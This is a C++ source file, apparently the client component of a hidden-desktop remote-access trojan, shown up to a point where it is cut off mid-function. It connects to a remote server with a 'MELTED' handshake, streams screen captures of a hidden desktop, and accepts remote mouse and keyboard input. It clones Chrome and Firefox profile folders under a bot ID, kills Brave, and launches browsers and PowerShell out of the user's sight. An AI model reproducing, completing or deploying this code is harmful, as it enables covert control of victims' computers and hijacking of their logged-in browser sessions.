#include "Hd.h"
#include <windowsx.h>
#include <windows.h>
#include <process.h>
#include <tlhelp32.h>
#include <winbase.h>
#include <string.h>
#include <gdiplus.h>
#include <vector>
#include "../common/ScreenTransfer/ScreenCodec.h"
#pragma comment (lib,"Gdiplus.Lib")
using namespace Gdiplus;

enum Connection { desktop, input };
enum Input { mouse };

struct InputMessage
{
    DWORD msg;
    DWORD wParam;
    DWORD lParam;
};

static const BYTE     gc_magik[] = { 'M', 'E', 'L', 'T', 'E', 'D', 0 };
static const COLORREF gc_trans = RGB(255, 174, 201);
static const CLSID jpegID = { 0x557cf401, 0x1a04, 0x11d3,{ 0x9a,0x73,0x00,0x00,0xf8,0x1e,0xf3,0x2e } }; // id of jpeg format
static const DWORD    gc_frameIntervalMs = 33;
static const DWORD    gc_socketTimeoutMs = 5000;

enum WmStartApp { startExplorer = WM_USER + 1, startRun, startChrome, startEdge, startBrave, startFirefox, startIexplore, startPowershell };

static int        g_port;
static char       g_host[MAX_PATH];
static BOOL       g_started = FALSE;
static BYTE      *g_pixels = NULL;
static BYTE      *g_oldPixels = NULL;
static BYTE      *g_tempPixels = NULL;
static HDESK      g_hDesk;
static BITMAPINFO g_bmpInfo;
static HANDLE     g_hInputThread, g_hDesktopThread;
static ULONG_PTR  g_gdiplusToken;
static BOOL       g_gdiplusStarted = FALSE;
static BOOL       g_lastCaptureFailed = FALSE;
static char       g_desktopName[MAX_PATH];
static HWND       g_lastInputHwnd = NULL;
static ULARGE_INTEGER lisize;
static LARGE_INTEGER offset;

static const char *InputMsgName(UINT msg)
{
    switch (msg)
    {
    case WM_LBUTTONDOWN: return "WM_LBUTTONDOWN";
    case WM_LBUTTONUP: return "WM_LBUTTONUP";
    case WM_RBUTTONDOWN: return "WM_RBUTTONDOWN";
    case WM_RBUTTONUP: return "WM_RBUTTONUP";
    case WM_MBUTTONDOWN: return "WM_MBUTTONDOWN";
    case WM_MBUTTONUP: return "WM_MBUTTONUP";
    case WM_LBUTTONDBLCLK: return "WM_LBUTTONDBLCLK";
    case WM_RBUTTONDBLCLK: return "WM_RBUTTONDBLCLK";
    case WM_MBUTTONDBLCLK: return "WM_MBUTTONDBLCLK";
    case WM_MOUSEMOVE: return "WM_MOUSEMOVE";
    case WM_MOUSEWHEEL: return "WM_MOUSEWHEEL";
    case WM_CHAR: return "WM_CHAR";
    case WM_KEYDOWN: return "WM_KEYDOWN";
    case WM_KEYUP: return "WM_KEYUP";
    case WM_SYSCHAR: return "WM_SYSCHAR";
    case WM_SYSKEYDOWN: return "WM_SYSKEYDOWN";
    case WM_SYSKEYUP: return "WM_SYSKEYUP";
    default: return "UNKNOWN";
    }
}

static HWND GetTopLevelWindow(HWND hWnd)
{
    if (!hWnd)
        return NULL;

    HWND topHwnd = hWnd;
    while ((GetWindowLongA(topHwnd, GWL_STYLE) & WS_CHILD))
    {
        HWND parent = GetParent(topHwnd);
        if (!parent)
            break;
        topHwnd = parent;
    }
    return topHwnd;
}

static void DescribeWindow(HWND hWnd, char *className, int classNameSize, char *title, int titleSize)
{
    if (classNameSize > 0)
        className[0] = 0;
    if (titleSize > 0)
        title[0] = 0;

    if (!hWnd)
        return;

    GetClassNameA(hWnd, className, classNameSize);
    GetWindowTextA(hWnd, title, titleSize);
}

static BOOL ShouldLogInput(UINT msg)
{
    static DWORD moveCount = 0;
    if (msg == WM_MOUSEMOVE)
    {
        ++moveCount;
        return (moveCount % 60) == 1;
    }
    return TRUE;
}

static void LogInputTarget(const char *stage, UINT msg, HWND hWnd, POINT screenPoint, POINT clientPoint, BOOL result)
{
    char className[128];
    char title[128];
    DescribeWindow(hWnd, className, sizeof(className), title, sizeof(title));
    printf("[input] %s %s hwnd=0x%p class='%s' title='%s' screen=(%ld,%ld) client=(%ld,%ld) result=%s lastError=%lu\n",
        stage,
        InputMsgName(msg),
        hWnd,
        className,
        title,
        screenPoint.x,
        screenPoint.y,
        clientPoint.x,
        clientPoint.y,
        result ? "ok" : "failed",
        GetLastError());
}

static void FreePixelBuffers()
{
    Funcs::pFree(g_pixels);
    Funcs::pFree(g_oldPixels);
    Funcs::pFree(g_tempPixels);
    g_pixels = NULL;
    g_oldPixels = NULL;
    g_tempPixels = NULL;
}

static BOOL BitmapToJpg(HDC hDc, HBITMAP hBmpImage, int height)
{
    BOOL ret = FALSE;
    HBITMAP hBmpCopy = NULL;
    IStream *jpegStream = NULL;
    Bitmap *image = NULL;
    Bitmap *jpeg = NULL;
    HBITMAP compressedImage = NULL;
    LARGE_INTEGER streamOffset = { 0 };

    if (!g_gdiplusStarted)
        goto exit;

    // FromHBITMAP rejects bitmaps that are or were selected into a DC
    hBmpCopy = (HBITMAP)CopyImage(hBmpImage, IMAGE_BITMAP, 0, 0, LR_CREATEDIBSECTION);
    if (!hBmpCopy)
        goto exit;

    if (CreateStreamOnHGlobal(NULL, TRUE, &jpegStream) != S_OK || !jpegStream)
        goto exit;

    image = Bitmap::FromHBITMAP(hBmpCopy, NULL);
    if (!image || image->GetLastStatus() != Ok)
        goto exit;

    if (image->Save(jpegStream, &jpegID, NULL) != Ok)
        goto exit;

    if (jpegStream->Seek(streamOffset, STREAM_SEEK_SET, NULL) != S_OK)
        goto exit;

    jpeg = Bitmap::FromStream(jpegStream);
    if (!jpeg || jpeg->GetLastStatus() != Ok)
        goto exit;

    if (jpeg->GetHBITMAP(Color::White, &compressedImage) != Ok)
        goto exit;

    if (Funcs::pGetDIBits(hDc, compressedImage, 0, height, g_pixels, (BITMAPINFO *)&g_bmpInfo, DIB_RGB_COLORS) != height)
        goto exit;

    ret = TRUE;

exit:
    if (compressedImage)
        Funcs::pDeleteObject(compressedImage);
    delete jpeg;
    delete image;
    if (hBmpCopy)
        Funcs::pDeleteObject(hBmpCopy);
    if (jpegStream)
        jpegStream->Release();
    return ret;
}

static BOOL PaintWindow(HWND hWnd, HDC hDc, HDC hDcScreen)
{
    BOOL ret = FALSE;
    RECT rect;
    Funcs::pGetWindowRect(hWnd, &rect);

    HDC     hDcWindow = Funcs::pCreateCompatibleDC(hDc);
    HBITMAP hBmpWindow = Funcs::pCreateCompatibleBitmap(hDc, rect.right - rect.left, rect.bottom - rect.top);
    HGDIOBJ hOldBmpWindow = NULL;
    if (!hDcWindow || !hBmpWindow)
        goto exit;

    hOldBmpWindow = Funcs::pSelectObject(hDcWindow, hBmpWindow);
    if (!hOldBmpWindow)
        goto exit;
    if (Funcs::pPrintWindow(hWnd, hDcWindow, PW_RENDERFULLCONTENT))
    {
        Funcs::pBitBlt(hDcScreen,
            rect.left,
            rect.top,
            rect.right - rect.left,
            rect.bottom - rect.top,
            hDcWindow,
            0,
            0,
            SRCCOPY);

        ret = TRUE;
    }
    Funcs::pSelectObject(hDcWindow, hOldBmpWindow);
exit:
    if (hBmpWindow)
        Funcs::pDeleteObject(hBmpWindow);
    if (hDcWindow)
        Funcs::pDeleteDC(hDcWindow);
    return ret;
}

static void EnumWindowsTopToDown(HWND owner, WNDENUMPROC proc, LPARAM param)
{
    HWND currentWindow = Funcs::pGetTopWindow(owner);
    if (currentWindow == NULL)
        return;
    if ((currentWindow = Funcs::pGetWindow(currentWindow, GW_HWNDLAST)) == NULL)
        return;
    while (proc(currentWindow, param) && (currentWindow = Funcs::pGetWindow(currentWindow, GW_HWNDPREV)) != NULL);
}

struct EnumHwndsPrintData
{
    HDC hDc;
    HDC hDcScreen;
};

static BOOL CALLBACK EnumHwndsPrint(HWND hWnd, LPARAM lParam)
{
    EnumHwndsPrintData *data = (EnumHwndsPrintData *)lParam;

    if (!Funcs::pIsWindowVisible(hWnd))
        return TRUE;

    PaintWindow(hWnd, data->hDc, data->hDcScreen);

    OSVERSIONINFO versionInfo;
    versionInfo.dwOSVersionInfoSize = sizeof(versionInfo);
    Funcs::pGetVersionExA(&versionInfo);
    if (versionInfo.dwMajorVersion < 6)
        EnumWindowsTopToDown(hWnd, EnumHwndsPrint, (LPARAM)data);
    return TRUE;
}

// Returns TRUE when there is no frame to send: unchanged pixels or capture failure
static BOOL GetDeskPixels(int serverWidth, int serverHeight)
{
    BOOL captureSuccess = FALSE;
    BOOL comparePixels = TRUE;
    HDC hDc = NULL;
    HDC hDcScreen = NULL;
    HDC hDcScreenResized = NULL;
    HBITMAP hBmpScreen = NULL;
    HBITMAP hBmpScreenResized = NULL;
    HGDIOBJ hOldBmpScreen = NULL;
    HGDIOBJ hOldBmpScreenResized = NULL;
    EnumHwndsPrintData data;
    RECT rect;
    HWND hWndDesktop = Funcs::pGetDesktopWindow();
    Funcs::pGetWindowRect(hWndDesktop, &rect);

    g_lastCaptureFailed = FALSE;

    if (serverWidth <= 0 || serverHeight <= 0 || rect.right <= 0 || rect.bottom <= 0)
        goto cleanup;

    hDc = Funcs::pGetDC(NULL);
    if (!hDc)
        goto cleanup;

    hDcScreen = Funcs::pCreateCompatibleDC(hDc);
    if (!hDcScreen)
        goto cleanup;

    hBmpScreen = Funcs::pCreateCompatibleBitmap(hDc, rect.right, rect.bottom);
    if (!hBmpScreen)
        goto cleanup;

    hOldBmpScreen = Funcs::pSelectObject(hDcScreen, hBmpScreen);
    if (!hOldBmpScreen)
        goto cleanup;

    data.hDc = hDc;
    data.hDcScreen = hDcScreen;

    EnumWindowsTopToDown(NULL, EnumHwndsPrint, (LPARAM)&data);

    if (serverWidth > rect.right)
        serverWidth = rect.right;
    if (serverHeight > rect.bottom)
        serverHeight = rect.bottom;

    if (serverWidth != rect.right || serverHeight != rect.bottom)
    {
        hBmpScreenResized = Funcs::pCreateCompatibleBitmap(hDc, serverWidth, serverHeight);
        if (!hBmpScreenResized)
            goto cleanup;

        hDcScreenResized = Funcs::pCreateCompatibleDC(hDc);
        if (!hDcScreenResized)
            goto cleanup;

        hOldBmpScreenResized = Funcs::pSelectObject(hDcScreenResized, hBmpScreenResized);
        if (!hOldBmpScreenResized)
            goto cleanup;
        Funcs::pSetStretchBltMode(hDcScreenResized, HALFTONE);
        if (!Funcs::pStretchBlt(hDcScreenResized, 0, 0, serverWidth, serverHeight,
            hDcScreen, 0, 0, rect.right, rect.bottom, SRCCOPY))
        {
            goto cleanup;
        }

        Funcs::pSelectObject(hDcScreen, hOldBmpScreen);
        hOldBmpScreen = NULL;
        Funcs::pDeleteObject(hBmpScreen);
        Funcs::pDeleteDC(hDcScreen);

        hBmpScreen = hBmpScreenResized;
        hDcScreen = hDcScreenResized;
        hOldBmpScreen = hOldBmpScreenResized;
        hBmpScreenResized = NULL;
        hDcScreenResized = NULL;
        hOldBmpScreenResized = NULL;
    }

    g_bmpInfo.bmiHeader.biSizeImage = serverWidth * 3 * serverHeight;

    if (g_pixels == NULL || (g_bmpInfo.bmiHeader.biWidth != serverWidth || g_bmpInfo.bmiHeader.biHeight != serverHeight))
    {
        FreePixelBuffers();

        g_pixels = (BYTE *)Alloc(g_bmpInfo.bmiHeader.biSizeImage);
        g_oldPixels = (BYTE *)Alloc(g_bmpInfo.bmiHeader.biSizeImage);
        g_tempPixels = (BYTE *)Alloc(g_bmpInfo.bmiHeader.biSizeImage);

        comparePixels = FALSE;
        if (!g_pixels || !g_oldPixels || !g_tempPixels)
        {
            FreePixelBuffers();
            goto cleanup;
        }
    }

    g_bmpInfo.bmiHeader.biWidth = serverWidth;
    g_bmpInfo.bmiHeader.biHeight = serverHeight;

    Funcs::pSelectObject(hDcScreen, hOldBmpScreen);
    hOldBmpScreen = NULL;

    // Use raw pixels directly. The previous JPEG round-trip was very expensive and
    // caused visible input lag before the frame was compressed for transport.
    if (Funcs::pGetDIBits(hDcScreen, hBmpScreen, 0, serverHeight, g_pixels, &g_bmpInfo, DIB_RGB_COLORS) == serverHeight)
        captureSuccess = TRUE;

cleanup:
    if (hOldBmpScreenResized && hDcScreenResized)
        Funcs::pSelectObject(hDcScreenResized, hOldBmpScreenResized);
    if (hBmpScreenResized)
        Funcs::pDeleteObject(hBmpScreenResized);
    if (hDcScreenResized)
        Funcs::pDeleteDC(hDcScreenResized);

    if (hOldBmpScreen && hDcScreen)
        Funcs::pSelectObject(hDcScreen, hOldBmpScreen);
    if (hBmpScreen)
        Funcs::pDeleteObject(hBmpScreen);
    if (hDc)
        Funcs::pReleaseDC(NULL, hDc);
    if (hDcScreen)
        Funcs::pDeleteDC(hDcScreen);

    if (!captureSuccess)
    {
        g_bmpInfo.bmiHeader.biWidth = 0;
        g_bmpInfo.bmiHeader.biHeight = 0;
        g_lastCaptureFailed = TRUE;
        // Treat a failed capture as an unchanged frame so the caller skips it
        return TRUE;
    }

    if (comparePixels)
    {
        for (DWORD i = 0; i < g_bmpInfo.bmiHeader.biSizeImage; i += 3)
        {
            if (g_pixels[i] == GetRValue(gc_trans) &&
                g_pixels[i + 1] == GetGValue(gc_trans) &&
                g_pixels[i + 2] == GetBValue(gc_trans))
            {
                ++g_pixels[i + 1];
            }
        }

        Funcs::pMemcpy(g_tempPixels, g_pixels, g_bmpInfo.bmiHeader.biSizeImage);

        BOOL same = TRUE;
        for (DWORD i = 0; i < g_bmpInfo.bmiHeader.biSizeImage - 1; i += 3)
        {
            if (g_pixels[i] == g_oldPixels[i] &&
                g_pixels[i + 1] == g_oldPixels[i + 1] &&
                g_pixels[i + 2] == g_oldPixels[i + 2])
            {
                g_pixels[i] = GetRValue(gc_trans);
                g_pixels[i + 1] = GetGValue(gc_trans);
                g_pixels[i + 2] = GetBValue(gc_trans);
            }
            else
                same = FALSE;
        }
        if (same)
            return TRUE;

        Funcs::pMemcpy(g_oldPixels, g_tempPixels, g_bmpInfo.bmiHeader.biSizeImage);
    }
    else
        Funcs::pMemcpy(g_oldPixels, g_pixels, g_bmpInfo.bmiHeader.biSizeImage);
    return FALSE;
}

static BOOL CaptureDesktopFrame(screen2::RawFrame& frame)
{
    BOOL captureSuccess = FALSE;
    HDC hDc = NULL;
    HDC hDcScreen = NULL;
    HBITMAP hBmpScreen = NULL;
    HGDIOBJ hOldBmpScreen = NULL;
    EnumHwndsPrintData data;
    RECT rect;
    HWND hWndDesktop = Funcs::pGetDesktopWindow();

    frame = screen2::RawFrame();
    Funcs::pGetWindowRect(hWndDesktop, &rect);
    if (rect.right <= rect.left || rect.bottom <= rect.top)
        goto cleanup;

    hDc = Funcs::pGetDC(NULL);
    if (!hDc)
        goto cleanup;

    hDcScreen = Funcs::pCreateCompatibleDC(hDc);
    if (!hDcScreen)
        goto cleanup;

    hBmpScreen = Funcs::pCreateCompatibleBitmap(hDc, rect.right - rect.left, rect.bottom - rect.top);
    if (!hBmpScreen)
        goto cleanup;

    hOldBmpScreen = Funcs::pSelectObject(hDcScreen, hBmpScreen);
    if (!hOldBmpScreen)
        goto cleanup;

    data.hDc = hDc;
    data.hDcScreen = hDcScreen;
    EnumWindowsTopToDown(NULL, EnumHwndsPrint, (LPARAM)&data);

    frame.virtualX = rect.left;
    frame.virtualY = rect.top;
    frame.screenWidth = rect.right - rect.left;
    frame.screenHeight = rect.bottom - rect.top;
    frame.width = frame.screenWidth;
    frame.height = frame.screenHeight;
    frame.stride = screen2::CalcStride24(frame.width);
    frame.pixels.assign(static_cast<size_t>(frame.stride) * frame.height, 0);

    BITMAPINFO topDownInfo;
    Funcs::pMemset(&topDownInfo, 0, sizeof(topDownInfo));
    topDownInfo.bmiHeader.biSize = sizeof(topDownInfo.bmiHeader);
    topDownInfo.bmiHeader.biPlanes = 1;
    topDownInfo.bmiHeader.biBitCount = 24;
    topDownInfo.bmiHeader.biCompression = BI_RGB;
    topDownInfo.bmiHeader.biWidth = frame.width;
    topDownInfo.bmiHeader.biHeight = -frame.height;
    topDownInfo.bmiHeader.biSizeImage = static_cast<DWORD>(frame.pixels.size());

    Funcs::pSelectObject(hDcScreen, hOldBmpScreen);
    hOldBmpScreen = NULL;
    if (Funcs::pGetDIBits(hDcScreen, hBmpScreen, 0, frame.height,
        frame.pixels.data(), &topDownInfo, DIB_RGB_COLORS) == frame.height)
    {
        captureSuccess = TRUE;
    }

cleanup:
    if (hOldBmpScreen && hDcScreen)
        Funcs::pSelectObject(hDcScreen, hOldBmpScreen);
    if (hBmpScreen)
        Funcs::pDeleteObject(hBmpScreen);
    if (hDcScreen)
        Funcs::pDeleteDC(hDcScreen);
    if (hDc)
        Funcs::pReleaseDC(NULL, hDc);
    if (!captureSuccess)
        frame = screen2::RawFrame();
    return captureSuccess;
}

static SOCKET ConnectServer()
{
    WSADATA     wsa;
    SOCKET      s;
    SOCKADDR_IN addr;

    printf("[diag] Connecting to server %s:%d\n", g_host, g_port);

    if (Funcs::pWSAStartup(MAKEWORD(2, 2), &wsa) != 0)
    {
        printf("[!] WSAStartup failed\n");
        return NULL;
    }
    if ((s = Funcs::pSocket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
    {
        printf("[!] socket() failed\n");
        return NULL;
    }

    hostent *he = Funcs::pGethostbyname(g_host);
    if (!he || !he->h_addr_list || !he->h_addr_list[0])
    {
        printf("[!] Failed to resolve host: %s\n", g_host);
        Funcs::pClosesocket(s);
        return NULL;
    }

    Funcs::pMemset(&addr, 0, sizeof(addr));
    Funcs::pMemcpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);
    addr.sin_family = AF_INET;
    addr.sin_port = Funcs::pHtons(g_port);

    if (Funcs::pConnect(s, (sockaddr *)&addr, sizeof(addr)) < 0)
    {
        printf("[!] connect() failed for %s:%d\n", g_host, g_port);
        Funcs::pClosesocket(s);
        return NULL;
    }

    int one = 1;
    Funcs::pSetsockopt(s, IPPROTO_TCP, TCP_NODELAY, (const char *)&one, sizeof(one));
    DWORD timeout = gc_socketTimeoutMs;
    // Keep receive operations blocking. The input channel may be idle until the
    // user clicks or types, but sends should not block forever on a stalled peer.
    Funcs::pSetsockopt(s, SOL_SOCKET, SO_SNDTIMEO, (const char *)&timeout, sizeof(timeout));

    printf("[+] Connected to server %s:%d\n", g_host, g_port);
    return s;
}

static BOOL SendAll(SOCKET s, const void *buffer, int size)
{
    const char *data = (const char *)buffer;
    int sent = 0;
    while (sent != size)
    {
        int ret = Funcs::pSend(s, data + sent, size - sent, 0);
        if (ret <= 0)
            return FALSE;
        sent += ret;
    }
    return TRUE;
}

static BOOL RecvAll(SOCKET s, void *buffer, int size)
{
    char *data = (char *)buffer;
    int received = 0;
    while (received != size)
    {
        int ret = Funcs::pRecv(s, data + received, size - received, 0);
        if (ret <= 0)
            return FALSE;
        received += ret;
    }
    return TRUE;
}

static BOOL SendInt(SOCKET s, int i)
{
    return SendAll(s, &i, (int)sizeof(i));
}

static BOOL RecvInt(SOCKET s, int *i)
{
    return RecvAll(s, i, (int)sizeof(*i));
}

static BOOL SendScreenPacket(SOCKET s, const std::vector<BYTE>& packet)
{
    if (packet.empty() || packet.size() > (size_t)screen2::MAX_WIRE_PACKET_SIZE)
        return FALSE;
    int packetSize = (int)packet.size();
    return SendInt(s, packetSize) && SendAll(s, packet.data(), packetSize);
}

static DWORD WINAPI DesktopThread(LPVOID param)
{
    DWORD sessionId = (DWORD)(ULONG_PTR)param;
    SOCKET s = ConnectServer();

    if (!s)
    {
        printf("[!] Desktop channel could not connect (session %lu)\n", sessionId);
        goto exit;
    }

    if (!Funcs::pSetThreadDesktop(g_hDesk))
    {
        printf("[!] Desktop channel SetThreadDesktop failed (session %lu)\n", sessionId);
        goto exit;
    }

    if (!SendAll(s, gc_magik, (int)sizeof(gc_magik)))
        goto exit;
    if (!SendInt(s, Connection::desktop))
        goto exit;
    if (!SendInt(s, (int)sessionId))
        goto exit;

    printf("[+] Desktop channel handshake sent (session %lu)\n", sessionId);

    screen2::ScreenFrameEncoder encoder(screen2::DEFAULT_JPEG_QUALITY);
    screen2::RawFrame rawFrame;
    screen2::RawFrame lastSizeFrame;
    BOOL sizeSent = FALSE;
    BOOL firstFrameLogged = FALSE;
    BOOL captureFailureLogged = FALSE;
    for (;;)
    {
        if (!CaptureDesktopFrame(rawFrame))
        {
            if (!captureFailureLogged)
            {
                printf("[!] Desktop capture failed; no frame will be sent until capture succeeds\n");
                captureFailureLogged = TRUE;
            }
            Funcs::pSleep(100);
            continue;
        }

        if (!sizeSent ||
            rawFrame.virtualX != lastSizeFrame.virtualX ||
            rawFrame.virtualY != lastSizeFrame.virtualY ||
            rawFrame.screenWidth != lastSizeFrame.screenWidth ||
            rawFrame.screenHeight != lastSizeFrame.screenHeight)
        {
            std::vector<BYTE> sizePacket;
            if (!screen2::BuildScreenSizePacket(rawFrame, sizePacket) || !SendScreenPacket(s, sizePacket))
            {
                goto exit;
            }
            lastSizeFrame = rawFrame;
            sizeSent = TRUE;
        }

        std::vector<BYTE> framePacket;
        if (!encoder.BuildFrame(rawFrame, framePacket))
        {
            Funcs::pSleep(1000 / screen2::DEFAULT_FPS);
            continue;
        }

        if (!SendScreenPacket(s, framePacket))
            goto exit;

        int response = 0;
        if (!RecvInt(s, &response))
            goto exit;
        if (response != 0)
            encoder.ForceKeyframe();
        else
            encoder.CommitLastBuiltFrame();

        if (!firstFrameLogged)
        {
            printf("[+] First SCREEN2 desktop frame sent: remote=%dx%d, frame=%dx%d, packet=%zu bytes\n",
                rawFrame.screenWidth,
                rawFrame.screenHeight,
                rawFrame.width,
                rawFrame.height,
                framePacket.size());
            firstFrameLogged = TRUE;
        }

        Funcs::pSleep(1000 / screen2::DEFAULT_FPS);
    }

exit:
    printf("[!] Desktop thread exiting (session %lu)\n", sessionId);
    if (s)
        Funcs::pClosesocket(s);
    if (g_hInputThread)
        Funcs::pTerminateThread(g_hInputThread, 0);
    return 0;
}

static void killproc(const char* name)
{
    HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
    PROCESSENTRY32 pEntry;
    pEntry.dwSize = sizeof(pEntry);
    BOOL hRes = Process32First(hSnapShot, &pEntry);
    while (hRes)
    {
        if (strcmp(pEntry.szExeFile, name) == 0)
        {
            HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0,
                (DWORD)pEntry.th32ProcessID);
            if (hProcess != NULL)
            {
                TerminateProcess(hProcess, 9);
                CloseHandle(hProcess);
            }
        }
        hRes = Process32Next(hSnapShot, &pEntry);
    }
    CloseHandle(hSnapShot);
}

static void StartChrome()
{
    char chromePath[MAX_PATH] = { 0 };
    Funcs::pSHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, chromePath);
    Funcs::pLstrcatA(chromePath, Strs::hd7);

    char dataPath[MAX_PATH] = { 0 };
    Funcs::pLstrcpyA(dataPath, chromePath);
    Funcs::pLstrcatA(dataPath, Strs::hd10);

    char botId[BOT_ID_LEN] = { 0 };
    char newDataPath[MAX_PATH] = { 0 };
    Funcs::pLstrcpyA(newDataPath, chromePath);
    GetBotId(botId);
    Funcs::pLstrcatA(newDataPath, botId);

    CopyDir(dataPath, newDataPath);

    char path[MAX_PATH] = { 0 };
    Funcs::pLstrcpyA(path, Strs::hd8);
    Funcs::pLstrcatA(path, Strs::chromeExe);
    Funcs::pLstrcatA(path, Strs::hd9);
    Funcs::pLstrcatA(path, "\"");
    Funcs::pLstrcatA(path, newDataPath);

    STARTUPINFOA startupInfo = { 0 };
    startupInfo.cb = sizeof(startupInfo);
    startupInfo.lpDesktop = g_desktopName;
    PROCESS_INFORMATION processInfo = { 0 };
    Funcs::pCreateProcessA(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
}

static void StartEdge()
{
    char path[MAX_PATH] = { 0 };
    Funcs::pLstrcpyA(path, Strs::hd8);
    Funcs::pLstrcatA(path, Strs::edgeExe);
    Funcs::pLstrcatA(path, Strs::hd9);

    STARTUPINFOA startupInfo = { 0 };
    startupInfo.cb = sizeof(startupInfo);
    startupInfo.lpDesktop = g_desktopName;
    PROCESS_INFORMATION processInfo = { 0 };
    Funcs::pCreateProcessA(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
}

static void StartBrave()
{
    killproc("brave.exe");
    char path[MAX_PATH] = { 0 };
    Funcs::pLstrcpyA(path, Strs::hd8);
    Funcs::pLstrcatA(path, Strs::braveExe);
    Funcs::pLstrcatA(path, Strs::hd9);

    STARTUPINFOA startupInfo = { 0 };
    startupInfo.cb = sizeof(startupInfo);
    startupInfo.lpDesktop = g_desktopName;
    PROCESS_INFORMATION processInfo = { 0 };
    Funcs::pCreateProcessA(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
}

static void StartFirefox()
{
    char firefoxPath[MAX_PATH] = { 0 };
    Funcs::pSHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, firefoxPath);
    Funcs::pLstrcatA(firefoxPath, Strs::hd11);

    char profilesIniPath[MAX_PATH] = { 0 };
    Funcs::pLstrcpyA(profilesIniPath, firefoxPath);
    Funcs::pLstrcatA(profilesIniPath, Strs::hd5);

    HANDLE hProfilesIni = CreateFileA
    (
        profilesIniPath,
        FILE_READ_ACCESS,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if (hProfilesIni == INVALID_HANDLE_VALUE)
        return;

    DWORD profilesIniSize = GetFileSize(hProfilesIni, 0);
    DWORD read;
    char *profilesIniContent = (char *)Alloc(profilesIniSize + 1);
    BOOL isRelative = FALSE;
    char *isRelativeRead = NULL;
    char *path = NULL;
    char *pathEnd = NULL;
    char realPath[MAX_PATH] = { 0 };
    char botId[BOT_ID_LEN];
    char newPath[MAX_PATH];
    char browserPath[MAX_PATH] = { 0 };
    STARTUPINFOA startupInfo = { 0 };
    PROCESS_INFORMATION processInfo = { 0 };
    ReadFile(hProfilesIni, profilesIniContent, profilesIniSize, &read, NULL);
    profilesIniContent[profilesIniSize] = 0;

    isRelativeRead = Funcs::pStrStrA(profilesIniContent, Strs::hd12);
    if (!isRelativeRead)
        goto exit;
    isRelativeRead += 11;
    isRelative = (*isRelativeRead == '1');

    path = Funcs::pStrStrA(profilesIniContent, Strs::hd13);
    if (!path)
        goto exit;
    pathEnd = Funcs::pStrStrA(path, "\r");
    if (!pathEnd)
        goto exit;
    *pathEnd = 0;
    path += 5;

    if (isRelative)
        Funcs::pLstrcpyA(realPath, firefoxPath);
    Funcs::pLstrcatA(realPath, path);

    GetBotId(botId);

    Funcs::pLstrcpyA(newPath, firefoxPath);
    Funcs::pLstrcatA(newPath, botId);

    CopyDir(realPath, newPath);

    Funcs::pLstrcpyA(browserPath, Strs::hd8);
    Funcs::pLstrcatA(browserPath, Strs::firefoxExe);
    Funcs::pLstrcatA(browserPath, Strs::hd14);
    Funcs::pLstrcatA(browserPath, "\"");
    Funcs::pLstrcatA(browserPath, newPath);
    Funcs::pLstrcatA(browserPath, "\"");

    startupInfo.cb = sizeof(startupInfo);
    startupInfo.lpDesktop = g_desktopName;
    Funcs::pCreateProcessA(NULL, browserPath, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);

exit:
    Funcs::pCloseHandle(hProfilesIni);
    Funcs::pFree(profilesIniContent);

}

static void StartPowershell()
{
    char path[MAX_PATH] = { 0 };
    Funcs::pLstrcpyA(path, Strs::hd8);
    Funcs::pLstrcatA(path, Strs::powershell);

    STARTUPINFOA startupInfo = { 0 };
    startupInfo.cb = sizeof(startupInfo);
    startupInfo.lpDesktop = g_desktopName;
    PROCESS_INFORMATION processInfo = { 0 };
    Funcs::pCreateProcessA(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
}

static void StartIe()
{
    char path[MAX_PATH] = { 0 };
    Funcs::pLstrcpyA(path, Strs::hd8);
    Funcs::pLstrcatA(path, Strs::iexploreExe);

    STARTUPINFOA startupInfo = { 0 };
    startupInfo.cb = sizeof(startupInfo);
    startupInfo.lpDesktop = g_desktopName;
    PROCESS_INFORMATION processInfo = { 0 };
    Funcs::pCreateProcessA(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
}

static DWORD WINAPI InputThread(LPVOID param)
{
    SOCKET s = ConnectServer();

    if (!s)
    {
        printf("[!] Input channel could not connect\n");
        return 0;
    }

    if (Funcs::pSetThreadDesktop(g_hDesk))
        printf("[diag] Input thread attached to desktop: %s\n", g_desktopName);
    else
        printf("[!] Input thread SetThreadDesktop failed\n");

    if (!SendAll(s, gc_magik, (int)sizeof(gc_magik)))
    {
        printf("[!] Failed to send input channel magic\n");
        goto exit;
    }
    if (!SendInt(s, Connection::input))
    {
        printf("[!] Failed to send input channel id\n");
        goto exit;
    }

    printf("[+] Input channel handshake sent\n");

    int sessionId;
    if (!RecvInt(s, &sessionId) || !sessionId)
    {
        printf("[!] Failed to receive session id from server\n");
        goto exit;
    }

    printf("[+] Input channel ready; session id=%d\n", sessionId);

    g_hDesktopThread = Funcs::pCreateThread(NULL, 0, DesktopThread, (LPVOID)(ULONG_PTR)(DWORD)sessionId, 0, 0);
    if (g_hDesktopThread)
        printf("[diag] Desktop thread created\n");
    else
        printf("[!] Desktop thread creation failed\n");

    POINT      lastPoint;
    BOOL       lmouseDown = FALSE;
    HWND       hResMoveWindow = NULL;
    LRESULT    resMoveType = NULL;

    lastPoint.x = 0;
    lastPoint.y = 0;

    for (;;)
    {
        InputMessage input;
        if (!RecvAll(s, &input, (int)sizeof(input)))
            goto exit;

        UINT   msg = (UINT)input.msg;
        WPARAM wParam = (WPARAM)input.wParam;
        LPARAM lParam = (LPARAM)input.lParam;

        HWND  hWnd{};
        POINT point;
        POINT lastPointCopy;
        BOOL  mouseMsg = FALSE;

        switch (msg)
        {
        case WmStartApp::startExplorer:
        {
            const DWORD neverCombine = 2;
            const char *valueName = Strs::hd4;

            HKEY hKey;
